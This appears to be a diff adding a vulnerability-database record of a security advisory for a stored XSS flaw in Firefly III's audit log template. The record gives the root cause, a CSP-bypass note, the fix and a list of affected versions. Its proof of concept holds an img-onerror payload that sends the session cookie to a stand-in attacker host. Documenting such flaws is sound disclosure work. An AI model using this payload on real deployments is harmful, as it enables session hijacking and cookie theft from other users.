@@ -1,0 +1,516 @@
+advisory_id: GHSA-6jq6-x4cx-qvcm
+datasource_id: github_osv/GHSA-6jq6-x4cx-qvcm
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-6jq6-x4cx-qvcm/GHSA-6jq6-x4cx-qvcm.json
+aliases: []
+summary: |
+  Firefly II has Stored XSS in Audit Log Entry view via piggy bank name (ale.twig)
+  ## Summary
+
+  The Twig template `resources/views/list/ale.twig` renders the piggy bank name from `AuditLogEntry.after.piggy` using the `|raw` filter, bypassing Twig's auto-escaping. A piggy bank created with an HTML payload in its name executes arbitrary JavaScript in any browser viewing that transaction's audit log.
+
+  ## Root Cause
+
+  The `|raw` filter is required on the outer `trans()` call to preserve `<span>` tags in the `amount` parameter (currency styling). However, this also disables escaping for the user-controlled `name` parameter.
+
+  **Vulnerable code (`resources/views/list/ale.twig` lines 107, 110):**
+  ```twig
+  {{ trans('firefly.ale_action_log_add', {
+      amount: formatAmountBySymbol(...),
+      name: logEntry.after.piggy
+  })|raw }}
+  ```
+
+  No HTML sanitization at storage time — `PiggyBankStoreRequest` only validates `min:1|max:255|uniquePiggyBankForUser`.
+
+  ## Data Flow
+
+  ```
+  POST /api/v1/piggy-banks {"name": "<img src=x onerror=...>"}
+    → Stored verbatim in piggy_banks.name
+    → Transaction rule fires add_to_piggy / remove_from_piggy
+    → UpdatePiggyBank::handle() stores AuditLogEntry.after.piggy = raw name
+    → Any user views /transactions/show/{id}
+    → ale.twig outputs unescaped payload → XSS fires
+  ```
+
+  ## CSP Note
+
+  The nonce-based CSP (`script-src 'nonce-...' 'strict-dynamic'`) does **not** prevent this attack. Inline event handlers (`onerror`, `onload`) in HTML attributes are governed by `script-src-attr`, which is unrestricted in the current policy. The `<img onerror=...>` payload bypasses the nonce requirement entirely.
+
+  ## PoC
+
+  1. Authenticate as any user
+  2. `POST /api/v1/piggy-banks` with `"name": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"`
+  3. Create a rule: action = "Add money to piggy bank [attacker's piggy bank]"
+  4. Trigger the rule on any transaction
+  5. Visit `/transactions/show/{id}` → payload fires
+
+  **Confirmed server response (v6.6.2):**
+  ```html
+  Added <span class="text-success money-positive">EUR 50.00</span> to piggy bank
+  "<img src=x onerror=alert(document.cookie)>"
+  ```
+
+  ## Impact
+
+  - Stored XSS persists in DB — fires for every user who views the transaction
+  - Cookie theft → session hijacking
+  - In multi-user setups: one user attacks another user or admin
+  - Chainable with CSRF-like operations
+
+  ## Fix
+
+  PR #12271 (merged into `develop`): add `|e` to escape only the user-controlled `name` parameter.
+
+  ```twig
+  {{ trans('firefly.ale_action_log_add', {
+      amount: formatAmountBySymbol(...),
+      name: logEntry.after.piggy|e
+  })|raw }}
+  ```
+impacted_packages:
+  - purl: pkg:composer/grumpydictator/firefly-iii
+    affected_versions: vers:composer/<=6.6.2
+    fixed_versions: vers:composer/6.6.3
+    affected_packages:
+      - pkg:composer/grumpydictator/firefly-iii@3.0.0
+      - pkg:composer/grumpydictator/firefly-iii@3.0.1
+      - pkg:composer/grumpydictator/firefly-iii@3.0.2
+      - pkg:composer/grumpydictator/firefly-iii@3.0.3
+      - pkg:composer/grumpydictator/firefly-iii@3.1.0
+      - pkg:composer/grumpydictator/firefly-iii@3.1.1
+      - pkg:composer/grumpydictator/firefly-iii@3.1.2
+      - pkg:composer/grumpydictator/firefly-iii@3.1.3
+      - pkg:composer/grumpydictator/firefly-iii@3.1.4
+      - pkg:composer/grumpydictator/firefly-iii@3.1.5
+      - pkg:composer/grumpydictator/firefly-iii@3.1.6
+      - pkg:composer/grumpydictator/firefly-iii@3.2.0
+      - pkg:composer/grumpydictator/firefly-iii@3.2.1
+      - pkg:composer/grumpydictator/firefly-iii@3.2.2
+      - pkg:composer/grumpydictator/firefly-iii@3.2.3
+      - pkg:composer/grumpydictator/firefly-iii@3.2.4
+      - pkg:composer/grumpydictator/firefly-iii@3.2.5
+      - pkg:composer/grumpydictator/firefly-iii@3.3.0
+      - pkg:composer/grumpydictator/firefly-iii@3.3.1
+      - pkg:composer/grumpydictator/firefly-iii@3.3.2
+      - pkg:composer/grumpydictator/firefly-iii@3.3.3
+      - pkg:composer/grumpydictator/firefly-iii@3.3.4
+      - pkg:composer/grumpydictator/firefly-iii@3.3.5
+      - pkg:composer/grumpydictator/firefly-iii@3.3.6
+      - pkg:composer/grumpydictator/firefly-iii@3.3.7
+      - pkg:composer/grumpydictator/firefly-iii@3.3.8
+      - pkg:composer/grumpydictator/firefly-iii@3.3.9
+      - pkg:composer/grumpydictator/firefly-iii@3.4.0
+      - pkg:composer/grumpydictator/firefly-iii@3.4.0%2B1
+      - pkg:composer/grumpydictator/firefly-iii@3.4.0%2B10
+      - pkg:composer/grumpydictator/firefly-iii@3.4.0%2B2
+      - pkg:composer/grumpydictator/firefly-iii@3.4.0%2B3
+      - pkg:composer/grumpydictator/firefly-iii@3.4.0%2B4
+      - pkg:composer/grumpydictator/firefly-iii@3.4.0%2B5
+      - pkg:composer/grumpydictator/firefly-iii@3.4.0%2B6
+      - pkg:composer/grumpydictator/firefly-iii@3.4.0%2B7
+      - pkg:composer/grumpydictator/firefly-iii@3.4.0%2B8
+      - pkg:composer/grumpydictator/firefly-iii@3.4.0%2B9
+      - pkg:composer/grumpydictator/firefly-iii@3.4.1
+      - pkg:composer/grumpydictator/firefly-iii@3.4.2
+      - pkg:composer/grumpydictator/firefly-iii@3.4.3
+      - pkg:composer/grumpydictator/firefly-iii@3.4.4
+      - pkg:composer/grumpydictator/firefly-iii@3.4.4%2B1
+      - pkg:composer/grumpydictator/firefly-iii@3.4.4%2B2
+      - pkg:composer/grumpydictator/firefly-iii@3.4.5
+      - pkg:composer/grumpydictator/firefly-iii@3.4.6
+      - pkg:composer/grumpydictator/firefly-iii@3.4.6%2B1
+      - pkg:composer/grumpydictator/firefly-iii@3.4.7
+      - pkg:composer/grumpydictator/firefly-iii@3.4.8
+      - pkg:composer/grumpydictator/firefly-iii@3.4.9
+      - pkg:composer/grumpydictator/firefly-iii@3.4.10
+      - pkg:composer/grumpydictator/firefly-iii@3.4.11
+      - pkg:composer/grumpydictator/firefly-iii@3.5.0
+      - pkg:composer/grumpydictator/firefly-iii@3.5.1
+      - pkg:composer/grumpydictator/firefly-iii@3.5.2
+      - pkg:composer/grumpydictator/firefly-iii@3.5.3
+      - pkg:composer/grumpydictator/firefly-iii@3.5.4
+      - pkg:composer/grumpydictator/firefly-iii@3.5.5
+      - pkg:composer/grumpydictator/firefly-iii@3.5.6
+      - pkg:composer/grumpydictator/firefly-iii@3.5.6%2B1
+      - pkg:composer/grumpydictator/firefly-iii@3.6.0
+      - pkg:composer/grumpydictator/firefly-iii@3.6.1
+      - pkg:composer/grumpydictator/firefly-iii@3.7.0
+      - pkg:composer/grumpydictator/firefly-iii@3.7.1
+      - pkg:composer/grumpydictator/firefly-iii@3.7.2
+      - pkg:composer/grumpydictator/firefly-iii@3.7.2%2B1
+      - pkg:composer/grumpydictator/firefly-iii@3.7.2%2B2
+      - pkg:composer/grumpydictator/firefly-iii@3.7.2%2B3
+      - pkg:composer/grumpydictator/firefly-iii@3.8.0
+      - pkg:composer/grumpydictator/firefly-iii@3.8.1
+      - pkg:composer/grumpydictator/firefly-iii@3.8.2
+      - pkg:composer/grumpydictator/firefly-iii@3.8.3
+      - pkg:composer/grumpydictator/firefly-iii@3.8.4
+      - pkg:composer/grumpydictator/firefly-iii@3.9.0
+      - pkg:composer/grumpydictator/firefly-iii@3.9.1
+      - pkg:composer/grumpydictator/firefly-iii@3.10.0
+      - pkg:composer/grumpydictator/firefly-iii@3.10.1
+      - pkg:composer/grumpydictator/firefly-iii@3.10.2
+      - pkg:composer/grumpydictator/firefly-iii@3.10.3
+      - pkg:composer/grumpydictator/firefly-iii@3.10.4
+      - pkg:composer/grumpydictator/firefly-iii@4.0.0
+      - pkg:composer/grumpydictator/firefly-iii@4.0.1
+      - pkg:composer/grumpydictator/firefly-iii@4.0.2
+      - pkg:composer/grumpydictator/firefly-iii@4.1.0
+      - pkg:composer/grumpydictator/firefly-iii@4.1.1
+      - pkg:composer/grumpydictator/firefly-iii@4.1.2
+      - pkg:composer/grumpydictator/firefly-iii@4.1.3
+      - pkg:composer/grumpydictator/firefly-iii@4.1.4
+      - pkg:composer/grumpydictator/firefly-iii@4.1.5
+      - pkg:composer/grumpydictator/firefly-iii@4.1.6
+      - pkg:composer/grumpydictator/firefly-iii@4.1.7
+      - pkg:composer/grumpydictator/firefly-iii@4.2.0
+      - pkg:composer/grumpydictator/firefly-iii@4.2.1
+      - pkg:composer/grumpydictator/firefly-iii@4.2.2
+      - pkg:composer/grumpydictator/firefly-iii@4.3.0
+      - pkg:composer/grumpydictator/firefly-iii@4.3.1
+      - pkg:composer/grumpydictator/firefly-iii@4.3.2
+      - pkg:composer/grumpydictator/firefly-iii@4.3.3
+      - pkg:composer/grumpydictator/firefly-iii@4.3.4
+      - pkg:composer/grumpydictator/firefly-iii@4.3.5
+      - pkg:composer/grumpydictator/firefly-iii@4.3.6
+      - pkg:composer/grumpydictator/firefly-iii@4.3.7
+      - pkg:composer/grumpydictator/firefly-iii@4.3.8
+      - pkg:composer/grumpydictator/firefly-iii@4.4.0
+      - pkg:composer/grumpydictator/firefly-iii@4.4.1
+      - pkg:composer/grumpydictator/firefly-iii@4.4.2
+      - pkg:composer/grumpydictator/firefly-iii@4.4.3
+      - pkg:composer/grumpydictator/firefly-iii@4.5.0
+      - pkg:composer/grumpydictator/firefly-iii@4.6.0
+      - pkg:composer/grumpydictator/firefly-iii@4.6.1
+      - pkg:composer/grumpydictator/firefly-iii@4.6.2
+      - pkg:composer/grumpydictator/firefly-iii@4.6.3
+      - pkg:composer/grumpydictator/firefly-iii@4.6.3%2B1
+      - pkg:composer/grumpydictator/firefly-iii@4.6.4
+      - pkg:composer/grumpydictator/firefly-iii@4.6.5
+      - pkg:composer/grumpydictator/firefly-iii@4.6.6
+      - pkg:composer/grumpydictator/firefly-iii@4.6.7
+      - pkg:composer/grumpydictator/firefly-iii@4.6.8
+      - pkg:composer/grumpydictator/firefly-iii@4.6.9
+      - pkg:composer/grumpydictator/firefly-iii@4.6.10
+      - pkg:composer/grumpydictator/firefly-iii@4.6.11
+      - pkg:composer/grumpydictator/firefly-iii@4.6.11%2B1
+      - pkg:composer/grumpydictator/firefly-iii@4.6.12
+      - pkg:composer/grumpydictator/firefly-iii@4.6.13
+      - pkg:composer/grumpydictator/firefly-iii@4.7.0
+      - pkg:composer/grumpydictator/firefly-iii@4.7.1
+      - pkg:composer/grumpydictator/firefly-iii@4.7.1%2B1
+      - pkg:composer/grumpydictator/firefly-iii@4.7.1%2B2
+      - pkg:composer/grumpydictator/firefly-iii@4.7.1%2B3
+      - pkg:composer/grumpydictator/firefly-iii@4.7.1%2B4
+      - pkg:composer/grumpydictator/firefly-iii@4.7.2
+      - pkg:composer/grumpydictator/firefly-iii@4.7.2%2B1
+      - pkg:composer/grumpydictator/firefly-iii@4.7.2%2B2
+      - pkg:composer/grumpydictator/firefly-iii@4.7.3
+      - pkg:composer/grumpydictator/firefly-iii@4.7.3%2B1
+      - pkg:composer/grumpydictator/firefly-iii@4.7.3%2B2
+      - pkg:composer/grumpydictator/firefly-iii@4.7.4
+      - pkg:composer/grumpydictator/firefly-iii@4.7.5
+      - pkg:composer/grumpydictator/firefly-iii@4.7.5%2B1
+      - pkg:composer/grumpydictator/firefly-iii@4.7.5%2B2
+      - pkg:composer/grumpydictator/firefly-iii@4.7.5%2B3
+      - pkg:composer/grumpydictator/firefly-iii@4.7.6
+      - pkg:composer/grumpydictator/firefly-iii@4.7.6%2B1
+      - pkg:composer/grumpydictator/firefly-iii@4.7.6%2B2
+      - pkg:composer/grumpydictator/firefly-iii@4.7.7
+      - pkg:composer/grumpydictator/firefly-iii@4.7.8
+      - pkg:composer/grumpydictator/firefly-iii@4.7.9
+      - pkg:composer/grumpydictator/firefly-iii@4.7.10
+      - pkg:composer/grumpydictator/firefly-iii@4.7.11
+      - pkg:composer/grumpydictator/firefly-iii@4.7.12
+      - pkg:composer/grumpydictator/firefly-iii@4.7.12%2B1
+      - pkg:composer/grumpydictator/firefly-iii@4.7.13
+      - pkg:composer/grumpydictator/firefly-iii@4.7.14
+      - pkg:composer/grumpydictator/firefly-iii@4.7.15
+      - pkg:composer/grumpydictator/firefly-iii@4.7.16
+      - pkg:composer/grumpydictator/firefly-iii@4.7.17
+      - pkg:composer/grumpydictator/firefly-iii@4.7.17%2B1
+      - pkg:composer/grumpydictator/firefly-iii@4.7.17%2B2
+      - pkg:composer/grumpydictator/firefly-iii@4.7.17%2B3
+      - pkg:composer/grumpydictator/firefly-iii@4.7.17%2B4
+      - pkg:composer/grumpydictator/firefly-iii@4.7.17%2B5
+      - pkg:composer/grumpydictator/firefly-iii@4.7.17%2B6
+      - pkg:composer/grumpydictator/firefly-iii@4.8.0
+      - pkg:composer/grumpydictator/firefly-iii@4.8.0%2B1
+      - pkg:composer/grumpydictator/firefly-iii@4.8.0%2B2
+      - pkg:composer/grumpydictator/firefly-iii@4.8.0%2B3
+      - pkg:composer/grumpydictator/firefly-iii@4.8.1
+      - pkg:composer/grumpydictator/firefly-iii@4.8.1%2B1
+      - pkg:composer/grumpydictator/firefly-iii@4.8.1%2B2
+      - pkg:composer/grumpydictator/firefly-iii@4.8.1%2B3
+      - pkg:composer/grumpydictator/firefly-iii@4.8.1%2B4
+      - pkg:composer/grumpydictator/firefly-iii@4.8.1%2B5
+      - pkg:composer/grumpydictator/firefly-iii@4.8.1%2B6
+      - pkg:composer/grumpydictator/firefly-iii@4.8.1%2B7
+      - pkg:composer/grumpydictator/firefly-iii@4.8.1%2B8
+      - pkg:composer/grumpydictator/firefly-iii@4.8.2-alpha.1
+      - pkg:composer/grumpydictator/firefly-iii@4.8.2-alpha.2
+      - pkg:composer/grumpydictator/firefly-iii@4.8.2-alpha.3
+      - pkg:composer/grumpydictator/firefly-iii@4.8.2-alpha.4
+      - pkg:composer/grumpydictator/firefly-iii@4.8.2-alpha.5
+      - pkg:composer/grumpydictator/firefly-iii@4.8.2-alpha.6
+      - pkg:composer/grumpydictator/firefly-iii@4.8.2-beta.1
+      - pkg:composer/grumpydictator/firefly-iii@4.8.2-beta.2
+      - pkg:composer/grumpydictator/firefly-iii@4.8.2
+      - pkg:composer/grumpydictator/firefly-iii@4.8.3-alpha.1
+      - pkg:composer/grumpydictator/firefly-iii@5.0.0-alpha.1
+      - pkg:composer/grumpydictator/firefly-iii@5.0.0-alpha.2
+      - pkg:composer/grumpydictator/firefly-iii@5.0.0-beta.1
+      - pkg:composer/grumpydictator/firefly-iii@5.0.0
+      - pkg:composer/grumpydictator/firefly-iii@5.0.1
+      - pkg:composer/grumpydictator/firefly-iii@5.0.2
+      - pkg:composer/grumpydictator/firefly-iii@5.0.3
+      - pkg:composer/grumpydictator/firefly-iii@5.0.4
+      - pkg:composer/grumpydictator/firefly-iii@5.0.5
+      - pkg:composer/grumpydictator/firefly-iii@5.1.0-alpha.1
+      - pkg:composer/grumpydictator/firefly-iii@5.1.0-beta.1
+      - pkg:composer/grumpydictator/firefly-iii@5.1.0
+      - pkg:composer/grumpydictator/firefly-iii@5.1.1
+      - pkg:composer/grumpydictator/firefly-iii@5.2.0-alpha.1
+      - pkg:composer/grumpydictator/firefly-iii@5.2.0-beta.1
+      - pkg:composer/grumpydictator/firefly-iii@5.2.0
+      - pkg:composer/grumpydictator/firefly-iii@5.2.1
+      - pkg:composer/grumpydictator/firefly-iii@5.2.2
+      - pkg:composer/grumpydictator/firefly-iii@5.2.3
+      - pkg:composer/grumpydictator/firefly-iii@5.2.4
+      - pkg:composer/grumpydictator/firefly-iii@5.2.5
+      - pkg:composer/grumpydictator/firefly-iii@5.2.6
+      - pkg:composer/grumpydictator/firefly-iii@5.2.7
+      - pkg:composer/grumpydictator/firefly-iii@5.2.8
+      - pkg:composer/grumpydictator/firefly-iii@5.3.0-alpha.1
+      - pkg:composer/grumpydictator/firefly-iii@5.3.0-beta.1
+      - pkg:composer/grumpydictator/firefly-iii@5.3.0-beta.2
+      - pkg:composer/grumpydictator/firefly-iii@5.3.0
+      - pkg:composer/grumpydictator/firefly-iii@5.3.1
+      - pkg:composer/grumpydictator/firefly-iii@5.3.2
+      - pkg:composer/grumpydictator/firefly-iii@5.3.3
+      - pkg:composer/grumpydictator/firefly-iii@5.4.0-alpha.1
+      - pkg:composer/grumpydictator/firefly-iii@5.4.0-alpha.2
+      - pkg:composer/grumpydictator/firefly-iii@5.4.0-alpha.3
+      - pkg:composer/grumpydictator/firefly-iii@5.4.0-beta.1
+      - pkg:composer/grumpydictator/firefly-iii@5.4.0
+      - pkg:composer/grumpydictator/firefly-iii@5.4.1
+      - pkg:composer/grumpydictator/firefly-iii@5.4.2
+      - pkg:composer/grumpydictator/firefly-iii@5.4.3
+      - pkg:composer/grumpydictator/firefly-iii@5.4.4
+      - pkg:composer/grumpydictator/firefly-iii@5.4.5
+      - pkg:composer/grumpydictator/firefly-iii@5.4.6
+      - pkg:composer/grumpydictator/firefly-iii@5.5.0-beta.1
+      - pkg:composer/grumpydictator/firefly-iii@5.5.0-beta.2
+      - pkg:composer/grumpydictator/firefly-iii@5.5.0-beta.3
+      - pkg:composer/grumpydictator/firefly-iii@5.5.0
+      - pkg:composer/grumpydictator/firefly-iii@5.5.1
+      - pkg:composer/grumpydictator/firefly-iii@5.5.2
+      - pkg:composer/grumpydictator/firefly-iii@5.5.3
+      - pkg:composer/grumpydictator/firefly-iii@5.5.4
+      - pkg:composer/grumpydictator/firefly-iii@5.5.5
+      - pkg:composer/grumpydictator/firefly-iii@5.5.6
+      - pkg:composer/grumpydictator/firefly-iii@5.5.7
+      - pkg:composer/grumpydictator/firefly-iii@5.5.8
+      - pkg:composer/grumpydictator/firefly-iii@5.5.9
+      - pkg:composer/grumpydictator/firefly-iii@5.5.10
+      - pkg:composer/grumpydictator/firefly-iii@5.5.11
+      - pkg:composer/grumpydictator/firefly-iii@5.5.12
+      - pkg:composer/grumpydictator/firefly-iii@5.5.13
+      - pkg:composer/grumpydictator/firefly-iii@5.6.0-alpha.1
+      - pkg:composer/grumpydictator/firefly-iii@5.6.0-alpha.2
+      - pkg:composer/grumpydictator/firefly-iii@5.6.0
+      - pkg:composer/grumpydictator/firefly-iii@5.6.1
+      - pkg:composer/grumpydictator/firefly-iii@5.6.2
+      - pkg:composer/grumpydictator/firefly-iii@5.6.3
+      - pkg:composer/grumpydictator/firefly-iii@5.6.4
+      - pkg:composer/grumpydictator/firefly-iii@5.6.5
+      - pkg:composer/grumpydictator/firefly-iii@5.6.6
+      - pkg:composer/grumpydictator/firefly-iii@5.6.7
+      - pkg:composer/grumpydictator/firefly-iii@5.6.8
+      - pkg:composer/grumpydictator/firefly-iii@5.6.9
+      - pkg:composer/grumpydictator/firefly-iii@5.6.10
+      - pkg:composer/grumpydictator/firefly-iii@5.6.11
+      - pkg:composer/grumpydictator/firefly-iii@5.6.12
+      - pkg:composer/grumpydictator/firefly-iii@5.6.13
+      - pkg:composer/grumpydictator/firefly-iii@5.6.14
+      - pkg:composer/grumpydictator/firefly-iii@5.6.15
+      - pkg:composer/grumpydictator/firefly-iii@5.6.16
+      - pkg:composer/grumpydictator/firefly-iii@5.7.0
+      - pkg:composer/grumpydictator/firefly-iii@5.7.1
+      - pkg:composer/grumpydictator/firefly-iii@5.7.2
+      - pkg:composer/grumpydictator/firefly-iii@5.7.3
+      - pkg:composer/grumpydictator/firefly-iii@5.7.4
+      - pkg:composer/grumpydictator/firefly-iii@5.7.5
+      - pkg:composer/grumpydictator/firefly-iii@5.7.6
+      - pkg:composer/grumpydictator/firefly-iii@5.7.7
+      - pkg:composer/grumpydictator/firefly-iii@5.7.8
+      - pkg:composer/grumpydictator/firefly-iii@5.7.9
+      - pkg:composer/grumpydictator/firefly-iii@5.7.10
+      - pkg:composer/grumpydictator/firefly-iii@5.7.11
+      - pkg:composer/grumpydictator/firefly-iii@5.7.12
+      - pkg:composer/grumpydictator/firefly-iii@5.7.13
+      - pkg:composer/grumpydictator/firefly-iii@5.7.14
+      - pkg:composer/grumpydictator/firefly-iii@5.7.15
+      - pkg:composer/grumpydictator/firefly-iii@5.7.16
+      - pkg:composer/grumpydictator/firefly-iii@5.7.17
+      - pkg:composer/grumpydictator/firefly-iii@5.7.18
+      - pkg:composer/grumpydictator/firefly-iii@5.8.0-alpha.1
+      - pkg:composer/grumpydictator/firefly-iii@6.0.0-alpha.1
+      - pkg:composer/grumpydictator/firefly-iii@6.0.0-alpha.2
+      - pkg:composer/grumpydictator/firefly-iii@6.0.0-beta.1
+      - pkg:composer/grumpydictator/firefly-iii@6.0.0-beta.2
+      - pkg:composer/grumpydictator/firefly-iii@6.0.0
+      - pkg:composer/grumpydictator/firefly-iii@6.0.1
+      - pkg:composer/grumpydictator/firefly-iii@6.0.2
+      - pkg:composer/grumpydictator/firefly-iii@6.0.3
+      - pkg:composer/grumpydictator/firefly-iii@6.0.4
+      - pkg:composer/grumpydictator/firefly-iii@6.0.5
+      - pkg:composer/grumpydictator/firefly-iii@6.0.6
+      - pkg:composer/grumpydictator/firefly-iii@6.0.7
+      - pkg:composer/grumpydictator/firefly-iii@6.0.8
+      - pkg:composer/grumpydictator/firefly-iii@6.0.9
+      - pkg:composer/grumpydictator/firefly-iii@6.0.10
+      - pkg:composer/grumpydictator/firefly-iii@6.0.11
+      - pkg:composer/grumpydictator/firefly-iii@6.0.12
+      - pkg:composer/grumpydictator/firefly-iii@6.0.13
+      - pkg:composer/grumpydictator/firefly-iii@6.0.14
+      - pkg:composer/grumpydictator/firefly-iii@6.0.15
+      - pkg:composer/grumpydictator/firefly-iii@6.0.16
+      - pkg:composer/grumpydictator/firefly-iii@6.0.17
+      - pkg:composer/grumpydictator/firefly-iii@6.0.18
+      - pkg:composer/grumpydictator/firefly-iii@6.0.19
+      - pkg:composer/grumpydictator/firefly-iii@6.0.20
+      - pkg:composer/grumpydictator/firefly-iii@6.0.21
+      - pkg:composer/grumpydictator/firefly-iii@6.0.22
+      - pkg:composer/grumpydictator/firefly-iii@6.0.23
+      - pkg:composer/grumpydictator/firefly-iii@6.0.24
+      - pkg:composer/grumpydictator/firefly-iii@6.0.25
+      - pkg:composer/grumpydictator/firefly-iii@6.0.26
+      - pkg:composer/grumpydictator/firefly-iii@6.0.27
+      - pkg:composer/grumpydictator/firefly-iii@6.0.28
+      - pkg:composer/grumpydictator/firefly-iii@6.0.29
+      - pkg:composer/grumpydictator/firefly-iii@6.0.30
+      - pkg:composer/grumpydictator/firefly-iii@6.1.0-alpha.1
+      - pkg:composer/grumpydictator/firefly-iii@6.1.0
+      - pkg:composer/grumpydictator/firefly-iii@6.1.1
+      - pkg:composer/grumpydictator/firefly-iii@6.1.2
+      - pkg:composer/grumpydictator/firefly-iii@6.1.3
+      - pkg:composer/grumpydictator/firefly-iii@6.1.4
+      - pkg:composer/grumpydictator/firefly-iii@6.1.5
+      - pkg:composer/grumpydictator/firefly-iii@6.1.6
+      - pkg:composer/grumpydictator/firefly-iii@6.1.7
+      - pkg:composer/grumpydictator/firefly-iii@6.1.8
+      - pkg:composer/grumpydictator/firefly-iii@6.1.9
+      - pkg:composer/grumpydictator/firefly-iii@6.1.10
+      - pkg:composer/grumpydictator/firefly-iii@6.1.11
+      - pkg:composer/grumpydictator/firefly-iii@6.1.12
+      - pkg:composer/grumpydictator/firefly-iii@6.1.13
+      - pkg:composer/grumpydictator/firefly-iii@6.1.14
+      - pkg:composer/grumpydictator/firefly-iii@6.1.15
+      - pkg:composer/grumpydictator/firefly-iii@6.1.16
+      - pkg:composer/grumpydictator/firefly-iii@6.1.17
+      - pkg:composer/grumpydictator/firefly-iii@6.1.18
+      - pkg:composer/grumpydictator/firefly-iii@6.1.19
+      - pkg:composer/grumpydictator/firefly-iii@6.1.20
+      - pkg:composer/grumpydictator/firefly-iii@6.1.21
+      - pkg:composer/grumpydictator/firefly-iii@6.1.22
+      - pkg:composer/grumpydictator/firefly-iii@6.1.23
+      - pkg:composer/grumpydictator/firefly-iii@6.1.24
+      - pkg:composer/grumpydictator/firefly-iii@6.1.25
+      - pkg:composer/grumpydictator/firefly-iii@6.2.0-alpha.1
+      - pkg:composer/grumpydictator/firefly-iii@6.2.0-alpha.2
+      - pkg:composer/grumpydictator/firefly-iii@6.2.0-beta.1
+      - pkg:composer/grumpydictator/firefly-iii@6.2.0
+      - pkg:composer/grumpydictator/firefly-iii@6.2.1
+      - pkg:composer/grumpydictator/firefly-iii@6.2.2
+      - pkg:composer/grumpydictator/firefly-iii@6.2.3
+      - pkg:composer/grumpydictator/firefly-iii@6.2.4
+      - pkg:composer/grumpydictator/firefly-iii@6.2.5
+      - pkg:composer/grumpydictator/firefly-iii@6.2.6
+      - pkg:composer/grumpydictator/firefly-iii@6.2.7
+      - pkg:composer/grumpydictator/firefly-iii@6.2.8
+      - pkg:composer/grumpydictator/firefly-iii@6.2.9
+      - pkg:composer/grumpydictator/firefly-iii@6.2.10
+      - pkg:composer/grumpydictator/firefly-iii@6.2.11
+      - pkg:composer/grumpydictator/firefly-iii@6.2.12
+      - pkg:composer/grumpydictator/firefly-iii@6.2.13
+      - pkg:composer/grumpydictator/firefly-iii@6.2.14
+      - pkg:composer/grumpydictator/firefly-iii@6.2.15
+      - pkg:composer/grumpydictator/firefly-iii@6.2.16
+      - pkg:composer/grumpydictator/firefly-iii@6.2.17
+      - pkg:composer/grumpydictator/firefly-iii@6.2.18
+      - pkg:composer/grumpydictator/firefly-iii@6.2.19
+      - pkg:composer/grumpydictator/firefly-iii@6.2.20
+      - pkg:composer/grumpydictator/firefly-iii@6.2.21
+      - pkg:composer/grumpydictator/firefly-iii@6.3.0-beta.1
+      - pkg:composer/grumpydictator/firefly-iii@6.3.0-beta.2
+      - pkg:composer/grumpydictator/firefly-iii@6.3.0
+      - pkg:composer/grumpydictator/firefly-iii@6.3.1
+      - pkg:composer/grumpydictator/firefly-iii@6.3.2
+      - pkg:composer/grumpydictator/firefly-iii@6.4.0
+      - pkg:composer/grumpydictator/firefly-iii@6.4.1
+      - pkg:composer/grumpydictator/firefly-iii@6.4.2
+      - pkg:composer/grumpydictator/firefly-iii@6.4.3
+      - pkg:composer/grumpydictator/firefly-iii@6.4.4
+      - pkg:composer/grumpydictator/firefly-iii@6.4.5
+      - pkg:composer/grumpydictator/firefly-iii@6.4.6
+      - pkg:composer/grumpydictator/firefly-iii@6.4.7
+      - pkg:composer/grumpydictator/firefly-iii@6.4.8
+      - pkg:composer/grumpydictator/firefly-iii@6.4.9
+      - pkg:composer/grumpydictator/firefly-iii@6.4.10
+      - pkg:composer/grumpydictator/firefly-iii@6.4.11
+      - pkg:composer/grumpydictator/firefly-iii@6.4.12
+      - pkg:composer/grumpydictator/firefly-iii@6.4.13
+      - pkg:composer/grumpydictator/firefly-iii@6.4.14
+      - pkg:composer/grumpydictator/firefly-iii@6.4.15
+      - pkg:composer/grumpydictator/firefly-iii@6.4.16
+      - pkg:composer/grumpydictator/firefly-iii@6.4.17
+      - pkg:composer/grumpydictator/firefly-iii@6.4.18
+      - pkg:composer/grumpydictator/firefly-iii@6.4.19
+      - pkg:composer/grumpydictator/firefly-iii@6.4.20
+      - pkg:composer/grumpydictator/firefly-iii@6.4.21
+      - pkg:composer/grumpydictator/firefly-iii@6.4.22
+      - pkg:composer/grumpydictator/firefly-iii@6.4.23
+      - pkg:composer/grumpydictator/firefly-iii@6.5.0
+      - pkg:composer/grumpydictator/firefly-iii@6.5.1
+      - pkg:composer/grumpydictator/firefly-iii@6.5.2
+      - pkg:composer/grumpydictator/firefly-iii@6.5.3
+      - pkg:composer/grumpydictator/firefly-iii@6.5.4
+      - pkg:composer/grumpydictator/firefly-iii@6.5.5
+      - pkg:composer/grumpydictator/firefly-iii@6.5.6
+      - pkg:composer/grumpydictator/firefly-iii@6.5.7
+      - pkg:composer/grumpydictator/firefly-iii@6.5.8
+      - pkg:composer/grumpydictator/firefly-iii@6.5.9
+      - pkg:composer/grumpydictator/firefly-iii@6.6.0
+      - pkg:composer/grumpydictator/firefly-iii@6.6.1
+      - pkg:composer/grumpydictator/firefly-iii@6.6.2
+    fixed_packages:
+      - pkg:composer/grumpydictator/firefly-iii@6.6.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.1'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-6jq6-x4cx-qvcm/GHSA-6jq6-x4cx-qvcm.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-116
+  - CWE-79
+references:
+  - url: https://github.com/firefly-iii/firefly-iii
+    reference_type:
+    reference_id:
+  - url: https://github.com/firefly-iii/firefly-iii/pull/12271
+    reference_type:
+    reference_id:
+  - url: https://github.com/firefly-iii/firefly-iii/security/advisories/GHSA-6jq6-x4cx-qvcm
+    reference_type:
+    reference_id:
+exploits: []
